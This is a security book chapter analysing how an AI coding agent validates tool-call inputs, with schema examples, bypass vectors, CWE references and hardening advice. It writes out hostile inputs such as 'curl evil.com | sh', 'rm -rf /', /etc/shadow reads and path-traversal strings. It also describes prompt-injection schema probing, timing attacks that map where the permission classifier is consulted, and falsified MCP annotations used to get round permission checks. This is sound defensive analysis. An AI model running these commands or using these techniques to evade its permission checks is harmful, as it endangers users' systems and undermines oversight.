Chapter 13: Tool Input Validation

The previous chapters in Part IV examined prompt injection -- how malicious content crosses trust boundaries to influence the AI model's behavior. But prompt injection is only half of the tool-layer attack surface. The other half is tool input manipulation -- getting the model to send malformed, malicious, or semantically invalid inputs to tools that then execute real operations on the user's machine.

Every tool call in Claude Code passes through a validation pipeline before execution. That pipeline is the subject of this chapter. We examine Zod schema validation, the full dispatch pipeline from parse to sanitize, the gap between syntactic and semantic validation, and the concrete attack vectors that target each stage.

13.1 The Dispatch Pipeline

When the AI model returns a tool call, the input travels through six stages before the tool's implementation runs:

Each stage serves a distinct security function:

Stage Security Function Failure Mode
Parse Reject malformed JSON Syntax errors, truncated input, encoding attacks
Validate Enforce type contracts Type mismatches, missing fields, constraint violations
Authorize Apply permission policy Deny rules, user rejection, classifier block
Execute Run the tool implementation Exceptions, timeouts, resource exhaustion
Format Bound output size Context flooding, binary injection
Inject Add to conversation Message format violations

The critical security property: every stage produces a tool_result that the model receives as feedback. There are no silent failures. A parse error, a validation rejection, or a permission denial all generate structured error messages that the model reads and reacts to. This is essential for the agent's self-correction loop, but it also means error messages are part of the attack surface -- they can leak information about internal state (covered in Chapter 15).

13.2 JSON Parsing -- The First Gate

Tool inputs arrive as JSON strings from the streaming response pipeline. The first validation step is JSON.parse():

let parsed: unknown
try {
  parsed = JSON.parse(toolInput)
} catch (e) {
  return errorResult(`Failed to parse tool input: ${e.message}`)
}

What JSON Parsing Catches

  • Truncated input: If the model's response was cut off mid-tool-call (context window limit, network interruption), the JSON will be syntactically invalid. The parse rejects it.
  • Encoding errors: Malformed UTF-8 sequences, unexpected byte-order marks, or null bytes within strings.
  • Duplicate keys: JSON.parse() in V8 silently uses last-write-wins for duplicate keys. This is not a security gate -- if the model sends {"command": "safe", "command": "dangerous"}, the parsed result contains command: "dangerous".

What JSON Parsing Does Not Catch

JSON parsing is purely syntactic. It accepts any well-formed JSON regardless of semantic content:

{"command": "rm -rf /", "timeout": -1, "__proto__": {"polluted": true}}

This parses successfully. The rm -rf / is a valid string. The negative timeout is a valid number. The __proto__ key is valid JSON (though it creates a prototype pollution vector in JavaScript -- see Section 13.5). All semantic validation must happen at Stage 2.

CWE References

  • CWE-20: Improper Input Validation -- JSON parsing alone is insufficient input validation
  • CWE-74: Improper Neutralization of Special Elements in Output -- parse errors that include attacker-controlled content in error messages

13.3 Zod Schema Validation -- The Type Contract

Every built-in tool declares a Zod schema that defines the shape, types, and constraints of its input:

// BashTool schema
const inputSchema = z.object({
  command: z.string().describe("The shell command to execute"),
  timeout: z.number().optional().describe("Timeout in milliseconds"),
  run_in_background: z.boolean().optional(),
  description: z.string().optional(),
})

// ReadTool schema
const inputSchema = z.object({
  file_path: z.string().describe("Absolute path to the file"),
  offset: z.number().optional().describe("Line number to start from"),
  limit: z.number().optional().describe("Number of lines to read"),
})

// EditTool schema
const inputSchema = z.object({
  file_path: z.string().describe("Absolute path to the file"),
  old_string: z.string().describe("The text to find"),
  new_string: z.string().describe("The replacement text"),
  replace_all: z.boolean().optional(),
})

The Dual-Schema Architecture

Claude Code maintains two representations of each schema:

  1. Zod schemas -- used at runtime for validation after the tool call arrives
  2. JSON Schema -- sent to the model API to constrain generation

The Zod schema is the authoritative definition. JSON Schema is derived from it via automatic conversion (cached per session for prompt-cache stability). This means the model's generation is constrained by JSON Schema and the parsed result is validated by Zod -- defense in depth at the schema level.

Strict Mode

Some tools opt into strict: true on the API side:

const BashTool = buildTool({
  name: 'Bash',
  strict: true,
  inputSchema: z.object({
    command: z.string(),
    timeout: z.number().optional(),
  }),
})

When strict mode is enabled, the API guarantees the model's output matches the JSON Schema exactly. This eliminates an entire class of validation errors -- the model cannot produce a string where a number is expected, cannot omit required fields, and cannot add unexpected properties.

Security implication: Strict mode shifts the validation boundary from the agent process to the API. If the API's strict validation has bugs or the schema conversion introduces discrepancies, the Zod validation still catches them. The two layers are independent.

What Zod Validation Catches

Validation Example Error Message
Missing required field {} for BashTool (no command) Required at "command"
Wrong type {"command": 42} (number, not string) Expected string, received number at "command"
Unknown fields Extra properties when .strict() is used Unrecognized key(s) in object
Constraint violations offset: -1 when schema requires minimum: 0 Number must be greater than or equal to 0
Enum violations Invalid option for constrained fields Invalid enum value

What Zod Validation Does NOT Catch

This is where the security analysis gets interesting. Zod validates syntax and type, not semantics:

Passes Zod But Is Malicious
command: "curl evil.com \| sh" Remote code execution
file_path: "/etc/shadow" Sensitive file read
file_path: "../../.env" Path traversal
old_string: "" Empty string matches everywhere (CWE-697)
command: "rm -rf /" Destructive command
file_path: "/dev/zero" Infinite read (DoS)

Zod says "this is a valid string." The security system must determine whether that string represents a safe operation. This is the fundamental gap between schema validation and semantic validation -- and it is where most tool-layer attacks live.

13.4 The Semantic Validation Gap

Schema validation answers: "Is this input well-formed?" Semantic validation answers: "Is this input safe and appropriate in context?" Claude Code bridges this gap through tool-specific logic that runs after Zod validation but before execution.

Per-Tool Semantic Checks

    SW -->|Read| R1["Path validation<br/>Deny list check<br/>Size pre-flight<br/>Device path block"]
    SW -->|Write| W1["Read-before-write check<br/>Staleness detection<br/>Path restriction<br/>Partial view block"]
    SW -->|Edit| E1["File read check<br/>old_string uniqueness<br/>Identity edit reject<br/>Staleness detection"]
    SW -->|Bash| B1["Shell parsing<br/>Command classification<br/>Sandbox application<br/>Timeout enforcement"]

    B1 --> EXEC

    style ZOD fill:#e1f5fe
    style EXEC fill:#e8f5e9

Each tool implements its own semantic validation because the meaning of "safe input" varies by tool:

  • Read tool: A syntactically valid file path is semantically invalid if it points to /dev/zero (infinite read), /etc/shadow (sensitive file), or a denied path from settings.
  • Edit tool: A syntactically valid old_string is semantically invalid if it appears zero times (no match), more than once (ambiguous), or equals new_string (identity edit).
  • Bash tool: A syntactically valid command string is semantically invalid if it contains rm -rf /, DROP TABLE, or git push --force main.

The semantic validation layer is where Claude Code implements the security controls that schema validation cannot provide. It is also the layer with the most complexity, the most edge cases, and the most bypass potential.

The Fundamental Limitation

Semantic validation for the Bash tool is provably incomplete. The halting problem guarantees that no static analysis can determine all possible effects of an arbitrary shell command. Claude Code's approach -- a combination of shell parsing, pattern matching, and AI classification -- is a practical approximation that catches common dangerous patterns while accepting that novel attacks will evade it.

This is not a criticism. It is the honest security assessment: tool input validation provides defense in depth, not defense in totality. Every layer reduces the attack surface. No single layer eliminates it.

13.5 Schema Bypass Vectors

An attacker who controls the model's output (through prompt injection) or who provides malicious inputs (through a compromised MCP server) can attempt to bypass the validation pipeline. Here are the concrete vectors.

Vector 1: Type Coercion Exploits

JavaScript's type coercion interacts with Zod in potentially dangerous ways:

// Zod string schema
const schema = z.object({ path: z.string() })

// What if the model sends:
{ "path": ["../../etc/passwd", "decoy"] }

Zod does catch this -- z.string() rejects arrays. But consider a looser schema:

const schema = z.object({ 
  count: z.number(),
  options: z.record(z.unknown())  // Accepts any object
})

If a tool uses z.record(z.unknown()) or z.any() for flexibility, the attacker can inject nested objects with unexpected structure. The tool's implementation might iterate over the object's keys and encounter prototype-inherited properties or Symbol keys that were not anticipated.

Mitigation in Claude Code: Most tool schemas use specific types (z.string(), z.number(), z.boolean()) rather than permissive types like z.unknown() or z.any(). The MCP tool path is the exception -- MCP tool inputs use the JSON Schema provided by the external server, which can be arbitrarily permissive.

CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')

Vector 2: Nested Object Injection

When a tool schema accepts object-typed parameters, the attacker can embed nested structures that influence tool behavior:

{
  "command": "echo safe",
  "description": "Harmless command",
  "__proto__": {
    "shell": "/bin/bash -c 'curl evil.com | sh'"
  }
}

In JavaScript, JSON.parse() does not set __proto__ on the prototype chain -- it creates a regular property named "__proto__". However, if the parsed object is later spread into another object ({...parsed, ...defaults}) or passed through Object.assign(), some JavaScript engines may interpret the __proto__ key as a prototype setter, depending on the runtime and strict mode setting.

Mitigation in Claude Code: Zod's .parse() method creates a new object from the validated fields, discarding any properties not defined in the schema. This effectively strips __proto__, constructor, and any other unexpected keys from the input. The defense is accidental (a side effect of Zod's strict parsing) rather than intentional, but it is effective.

CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

Vector 3: Oversized Input Fields

Zod schemas typically do not constrain string length:

const schema = z.object({
  command: z.string(),  // No .max() constraint
})

An attacker can submit a command string of arbitrary length. If the string is logged, stored in memory, or passed to a subprocess, it may cause:

  • Memory exhaustion: A 100MB command string consumes significant heap
  • Log injection: An extremely long string that overflows log buffers
  • Buffer overflow in subprocesses: If the string is passed to a native command via execSync, the argument length may exceed ARG_MAX (typically 256KB on Linux, 1MB on macOS)

Mitigation: The API's max_tokens parameter provides an implicit upper bound on tool input size -- the model cannot generate more tokens than the configured limit. Additionally, the streaming pipeline has a per-tool-call byte limit. But these are indirect constraints. A direct z.string().max(MAX_COMMAND_LENGTH) would be more explicit.

CWE-400: Uncontrolled Resource Consumption

Vector 4: Unicode Normalization Attacks

File paths and command strings can contain Unicode characters that normalize to different byte sequences:

file_path: "/tmp/\u202E\u2066test.py"  // Right-to-left override + isolate

The path appears to end with .py but the Unicode directional overrides can make it display differently in terminals and logs. More practically:

file_path: "/tmp/ﬁle.txt"  // U+FB01 LATIN SMALL LIGATURE FI

This is a different file from /tmp/file.txt. If a deny rule checks for file.txt but the actual path uses the ligature, the deny rule is bypassed.

Mitigation: Claude Code's path validation uses path.resolve() and path.normalize(), which handle . and .. components but do not perform Unicode normalization. The Node.js fs API passes paths to the OS as-is, and most filesystems distinguish Unicode-equivalent paths. The deny list comparison operates on the resolved path string, which would need NFC/NFD normalization to catch homoglyph attacks.

CWE-176: Improper Handling of Unicode Encoding

Vector 5: Integer Overflow in Numeric Fields

Zod's z.number() accepts JavaScript Number values, which are IEEE 754 doubles:

{"offset": 9007199254740993}  // Exceeds Number.MAX_SAFE_INTEGER

At this magnitude, Number loses precision. The value 9007199254740993 becomes 9007199254740992 when parsed. If this offset is used in a file read, the tool reads from a slightly different position than specified.

More dangerous:

{"timeout": Infinity}

JSON.parse() does not produce Infinity (it is not valid JSON), but if the value passes through intermediate processing that converts the string "Infinity" to the number Infinity, a timeout of Infinity means "wait forever."

Mitigation: Zod provides .int(), .min(), .max(), .finite(), and .safe() refinements. Tools that accept numeric input should use these constraints. The Read tool, for example, uses .minimum(0) on offset values. But not all tools apply numeric constraints -- a general audit would identify which tools accept unconstrained numbers.

CWE-190: Integer Overflow or Wraparound

13.6 MCP Tool Input Validation -- The External Schema Problem

MCP tools present a fundamentally different validation challenge. Their schemas come from external servers, not from the Claude Code codebase:

    style MT fill:#fff3e0

The Schema Trust Problem

When the agent discovers MCP tools at startup, it receives JSON Schema definitions from each server. These schemas serve two purposes:

  1. Model generation constraint -- sent to the API to constrain the model's output
  2. Input validation -- (theoretically) used to validate the parsed tool call before execution

The security problem: the schema comes from the same source as the tool implementation. A malicious MCP server can declare a permissive schema ("type": "object" with no property constraints) that accepts any input, then use that input to perform arbitrary operations. The schema provides no independent security guarantee.

For built-in tools, the schema and the implementation are both maintained by the Claude Code team. The schema is a genuine contract -- if the implementation changes, the schema must change to match, and both are reviewed. For MCP tools, the schema and the implementation are both controlled by the external server. The schema is a self-declaration, not a verified contract.

Annotation-Based Trust

MCP tools carry capability annotations (readOnlyHint, destructiveHint, openWorldHint, idempotentHint) that inform the permission system. These annotations are self-reported by the server. As discussed in Chapter 16 of the architecture book, a malicious server can declare readOnlyHint: true on a tool that modifies state, bypassing the permission system's write-operation protections.

The defense is the permission system's deny-first architecture: deny rules override annotations, the auto-mode classifier evaluates MCP tool calls in conversation context regardless of annotations, and enterprise policy can deny entire servers. But the annotation system creates a false sense of security for users who assume that a "read-only" MCP tool is genuinely read-only.

CWE-284: Improper Access Control -- self-reported capabilities are not access control

13.7 The JSON Schema to Zod Conversion Gap

Built-in tools define Zod schemas, which are automatically converted to JSON Schema for the API. This conversion is cached per session for prompt-cache stability. But the conversion is not lossless:

Zod Feature JSON Schema Equivalent Conversion Fidelity
z.string() {"type": "string"} Exact
z.number().int() {"type": "integer"} Exact
z.number().min(0) {"type": "number", "minimum": 0} Exact
z.string().regex() {"type": "string", "pattern": "..."} Exact
z.union() {"oneOf": [...]} Approximate (oneOf vs anyOf semantics differ)
z.transform() No equivalent Lost -- transforms only run at Zod validation
z.refine() No equivalent Lost -- custom refinements cannot be expressed in JSON Schema
z.preprocess() No equivalent Lost -- preprocessing only runs at Zod validation
z.intersection() {"allOf": [...]} Approximate (complex intersection semantics vary)

The security implication: Zod refinements and transforms are invisible to the API. If a tool uses z.string().refine(s => !s.includes("..")) to block path traversal, the API knows only that the parameter is a string. The model can generate "../../etc/passwd" and the API will accept it. The path traversal is only caught by Zod validation at runtime.

This is not necessarily a weakness -- the API-side constraint is a convenience optimization (reducing invalid tool calls), while the Zod validation is the security control. But it means that security-critical constraints must be in Zod, not only in JSON Schema.

13.8 Timing and Error Oracle Attacks

Tool validation errors are returned to the model as tool_result messages. The error messages contain field-level details:

Validation error at "file_path": Required
Validation error at "offset": Number must be greater than or equal to 0
Validation error at "timeout": Expected number, received string

These error messages serve the agent's self-correction loop -- the model reads them and adjusts its tool call. But they also serve as an oracle for an attacker performing prompt injection:

The Validation Oracle Attack

  1. Attacker injects a prompt that causes the model to probe tool schemas
  2. Model sends deliberately malformed tool calls: {"file_path": 42}, {"file_path": []}, etc.
  3. Each validation error reveals the expected type for each field
  4. After probing, the attacker knows the tool's schema and can craft precise inputs

This attack is primarily relevant in indirect injection scenarios where the attacker controls content the model reads (a malicious file, a compromised MCP server response) but does not have direct access to the tool schemas.

Timing Side Channels

The six-stage pipeline creates measurable timing differences:

Failure Point Approximate Time
JSON parse failure < 1ms
Zod validation failure 1-5ms
Permission denial 5-50ms (rule evaluation)
Permission denial (AI classifier) 200-2000ms (model inference)
Execution timeout Configured timeout value

An attacker who can observe response timing (e.g., through a compromised MCP server that measures the delay between tool call and result) can distinguish between parse failures and permission denials. A fast failure (< 5ms) means the input was malformed. A slow failure (200ms+) means the input was well-formed but the AI classifier was invoked -- implying the input was not covered by explicit allow/deny rules.

CWE-208: Observable Timing Discrepancy

This timing information leaks the permission configuration: if a tool call for Bash("git status") resolves in < 5ms, it is covered by an explicit allow rule. If it takes 500ms, it went through the AI classifier. An attacker can use this to map which commands are explicitly allowed and which are classified at runtime, then focus attacks on the classifier's blind spots.

13.9 The Fail-Closed Default Pattern

Claude Code's tool system uses fail-closed defaults -- every safety-relevant property defaults to the restrictive option:

const DEFAULTS = {
  isReadOnly: () => false,         // Assume mutating until proven otherwise
  isDestructive: () => false,      // Assume non-destructive
  isConcurrencySafe: () => false,  // Assume unsafe to parallelize
  strict: false,                   // Assume flexible schema
}

Security analysis: The isReadOnly: false default is the most important. A new tool that forgets to declare itself read-only triggers full permission checks -- the user will be prompted before execution. This prevents the scenario where a forgotten declaration causes a mutating tool to auto-execute without permission.

The isConcurrencySafe: false default prevents a new tool from being parallelized with other operations, eliminating race conditions from undeclared concurrency.

However, the isDestructive: false default is worth questioning. If a new tool forgets to declare itself destructive, it bypasses the extra confirmation prompt that destructive tools trigger. The argument for false as the default: most tools are non-destructive, and defaulting to true would create excessive confirmation prompts during development. The argument against: the cost of a missed destructive declaration (silent data loss) exceeds the cost of an extra prompt.

13.10 Defense Recommendations

For the Validation Pipeline

  1. Add string length constraints to all Zod schemas. No tool should accept unbounded strings. The Read tool's file_path should have a .max(4096) (Linux PATH_MAX). The Bash tool's command should have a .max(1048576) (1MB, the macOS ARG_MAX).

  2. Add Unicode normalization to path validation. Before deny-list comparison, normalize paths to NFC form. This prevents homoglyph bypasses where Unicode-equivalent characters evade string matching.

  3. Differentiate error messages by trust level. Error messages returned to the model after user-initiated tool calls can be detailed. Error messages returned after model-initiated tool calls (especially in auto-mode) should be less specific -- "Invalid input" rather than "Required at 'file_path'" -- to reduce oracle attack utility.

  4. Audit MCP tool schemas at connection time. If an MCP tool declares "type": "object" with no property constraints, flag it as a permissive schema and require explicit user approval. A tool that accepts any input is either poorly designed or intentionally evasive.

  5. Add constant-time validation for security-sensitive paths. The timing difference between rule-based and classifier-based permission evaluation leaks configuration information. A constant-time wrapper that adds artificial delay to fast paths would close this channel.

For Schema Design

  1. Prefer .strict() on Zod objects to reject unknown properties. The current practice of stripping unknown properties is effective but silent. Strict mode makes unexpected properties a visible error.

  2. Use .finite() and .safe() on all numeric fields to prevent Infinity and unsafe integer values from reaching tool implementations.

  3. Document the semantic validation gap for each tool. If a tool's Zod schema accepts inputs that its implementation rejects (e.g., the Read tool rejects device paths like /dev/zero), document the semantic constraints alongside the schema.
